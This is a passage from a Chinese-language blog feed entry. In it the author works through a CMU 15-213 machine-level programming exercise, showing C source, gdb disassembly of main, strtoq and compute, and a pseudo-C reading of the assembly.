class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;inArg &lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; argv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; inArg&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argc &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Please rerun with a positive number argument\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    inArg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;inArg &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Argument was not a positive integer\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;compute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;inArg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;所以我们要让 gdb 打印 &lt;code&gt;Finish&lt;/code&gt; ，st 就得为 0， &lt;code&gt;inArg&lt;/code&gt;  就得为 0，那么就输入 1 个参数 &lt;code&gt;0&lt;/code&gt;  即可。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act4 0
Finish
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们要对汇编代码进行分析，就要使用 &lt;code&gt;gdb&lt;/code&gt; 。输入 &lt;code&gt;gdb act4&lt;/code&gt; ，输入 &lt;code&gt;disas main&lt;/code&gt; ，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401730 &amp;lt;+0&amp;gt;:     endbr64
   0x0000000000401734 &amp;lt;+4&amp;gt;:     sub    $0x8,%rsp
   0x0000000000401738 &amp;lt;+8&amp;gt;:     lea    0x938e1(%rip),%rdx        # 0x495020
   0x000000000040173f &amp;lt;+15&amp;gt;:    cmp    $0x1,%edi
   0x0000000000401742 &amp;lt;+18&amp;gt;:    je     0x40176d &amp;lt;main+61&amp;gt;
   0x0000000000401744 &amp;lt;+20&amp;gt;:    mov    0x8(%rsi),%rdi
   0x0000000000401748 &amp;lt;+24&amp;gt;:    mov    $0xa,%edx
   0x000000000040174d &amp;lt;+29&amp;gt;:    xor    %esi,%esi
   0x000000000040174f &amp;lt;+31&amp;gt;:    callq  0x410310 &amp;lt;strtoq&amp;gt;
   0x0000000000401754 &amp;lt;+36&amp;gt;:    test   %eax,%eax
   0x0000000000401756 &amp;lt;+38&amp;gt;:    js     0x401766 &amp;lt;main+54&amp;gt;
   0x0000000000401758 &amp;lt;+40&amp;gt;:    mov    %eax,%edi
   0x000000000040175a &amp;lt;+42&amp;gt;:    callq  0x401d20 &amp;lt;compute&amp;gt;
   0x000000000040175f &amp;lt;+47&amp;gt;:    xor    %eax,%eax
   0x0000000000401761 &amp;lt;+49&amp;gt;:    add    $0x8,%rsp
   0x0000000000401765 &amp;lt;+53&amp;gt;:    retq
   0x0000000000401766 &amp;lt;+54&amp;gt;:    lea    0x938e3(%rip),%rdx        # 0x495050
   0x000000000040176d &amp;lt;+61&amp;gt;:    mov    0xbef54(%rip),%rdi        # 0x4c06c8 &amp;lt;stderr&amp;gt;
   0x0000000000401774 &amp;lt;+68&amp;gt;:    mov    $0x1,%esi
   0x0000000000401779 &amp;lt;+73&amp;gt;:    xor    %eax,%eax
   0x000000000040177b &amp;lt;+75&amp;gt;:    callq  0x44c080 &amp;lt;__fprintf_chk&amp;gt;
   0x0000000000401780 &amp;lt;+80&amp;gt;:    mov    $0x1,%eax
   0x0000000000401785 &amp;lt;+85&amp;gt;:    jmp    0x401761 &amp;lt;main+49&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里代码分析如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 初始化 $rdi = 0x1, $rsi = 0x7fffffffdf18。因此 rdi = argc, rsi = argv&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 预留 8 个字节的栈空间&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rdx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rip &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x938e1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt; 这句是干嘛的？&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;edi &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rip &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xbef54&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;stderr&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      esi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      call fprintf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token comment&#34;&gt;//rsp 恢复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsi &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ecx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xa&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      esi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      call strtoq&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;eax &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         rdx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x938e3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; rip&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rip &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xbef54&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;stderr&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         esi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         call fprintf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token comment&#34;&gt;//rsp 恢复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         edi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         call compute&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token comment&#34;&gt;//rsp 恢复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里涉及到三个函数： &lt;code&gt;fprintf&lt;/code&gt; ， &lt;code&gt;strtoq&lt;/code&gt; , &lt;code&gt;compute&lt;/code&gt; 。 &lt;code&gt;fprintf&lt;/code&gt;  通常和 &lt;code&gt;stderr&lt;/code&gt;  结合在一起。&lt;/p&gt;
&lt;p&gt;对 &lt;code&gt;strtoq&lt;/code&gt;  进行反汇编得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas strtoq
Dump of assembler code for function strtoq:
   0x0000000000410310 &amp;lt;+0&amp;gt;:     endbr64
   0x0000000000410314 &amp;lt;+4&amp;gt;:     mov    $0xffffffffffffffa8,%rax
   0x000000000041031b &amp;lt;+11&amp;gt;:    xor    %ecx,%ecx
   0x000000000041031d &amp;lt;+13&amp;gt;:    mov    %fs:(%rax),%r8
   0x0000000000410321 &amp;lt;+17&amp;gt;:    jmpq   0x410370 &amp;lt;____strtoll_l_internal&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;compute&lt;/code&gt;  进行反汇编得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas compute
Dump of assembler code for function compute:
   0x0000000000401d20 &amp;lt;+0&amp;gt;:     endbr64
   0x0000000000401d24 &amp;lt;+4&amp;gt;:     lea    (%rdi,%rdi,2),%edx
   0x0000000000401d27 &amp;lt;+7&amp;gt;:     lea    0x932de(%rip),%rcx        # 0x49500c
   0x0000000000401d2e &amp;lt;+14&amp;gt;:    mov    %edx,%eax
   0x0000000000401d30 &amp;lt;+16&amp;gt;:    and    $0xf,%eax
   0x0000000000401d33 &amp;lt;+19&amp;gt;:    cmp    $0x4,%eax
   0x0000000000401d36 &amp;lt;+22&amp;gt;:    ja     0x401d53 &amp;lt;compute+51&amp;gt;
   0x0000000000401d38 &amp;lt;+24&amp;gt;:    movslq (%rcx,%rax,4),%rax
   0x0000000000401d3c &amp;lt;+28&amp;gt;:    add    %rcx,%rax
   0x0000000000401d3f &amp;lt;+31&amp;gt;:    notrack jmpq *%rax
   0x0000000000401d42 &amp;lt;+34&amp;gt;:    nopw   0x0(%rax,%rax,1)
   0x0000000000401d48 &amp;lt;+40&amp;gt;:    and    $0x1,%edx
   0x0000000000401d4b &amp;lt;+43&amp;gt;:    mov    %edx,%eax
   0x0000000000401d4d &amp;lt;+45&amp;gt;:    jmp    0x401d33 &amp;lt;compute+19&amp;gt;
   0x0000000000401d4f &amp;lt;+47&amp;gt;:    nop
   0x0000000000401d50 &amp;lt;+48&amp;gt;:    sar    $0x2,%edx
   0x0000000000401d53 &amp;lt;+51&amp;gt;:    mov    %edx,%eax
   0x0000000000401d55 &amp;lt;+53&amp;gt;:    and    $0xf,%eax
   0x0000000000401d58 &amp;lt;+56&amp;gt;:    test   %edx,%edx
   0x0000000000401d5a &amp;lt;+58&amp;gt;:    jns    0x401d33 &amp;lt;compute+19&amp;gt;
   0x0000000000401d5c &amp;lt;+60&amp;gt;:    retq
   0x0000000000401d5d &amp;lt;+61&amp;gt;:    nopl   (%rax)
   0x0000000000401d60 &amp;lt;+64&amp;gt;:    add    %edx,%edx
   0x0000000000401d62 &amp;lt;+66&amp;gt;:    jmp    0x401d53 &amp;lt;compute+51&amp;gt;
   0x0000000000401d64 &amp;lt;+68&amp;gt;:    nopl   0x0(%rax)
   0x0000000000401d68 &amp;lt;+72&amp;gt;:    sub    $0x1,%edx
   0x0000000000401d6b &amp;lt;+75&amp;gt;:    jmp    0x401d53 &amp;lt;compute+51&amp;gt;
   0x0000000000401d6d &amp;lt;+77&amp;gt;:    nopl   (%rax)
   0x0000000000401d70 &amp;lt;+80&amp;gt;:    lea    0x9328d(%rip),%rsi        # 0x495004
   0x0000000000401d77 &amp;lt;+87&amp;gt;:    mov    $0x1,%edi
   0x0000000000401d7c &amp;lt;+92&amp;gt;:    xor    %eax,%eax
   0x0000000000401d7e &amp;lt;+94&amp;gt;:    jmpq   0x44bfb0 &amp;lt;__printf_chk&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
</content>
        <updated>2024-02-29T09:19:39.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/</id>
        <title>15-213 Machine Procedures Activity 记录</title>
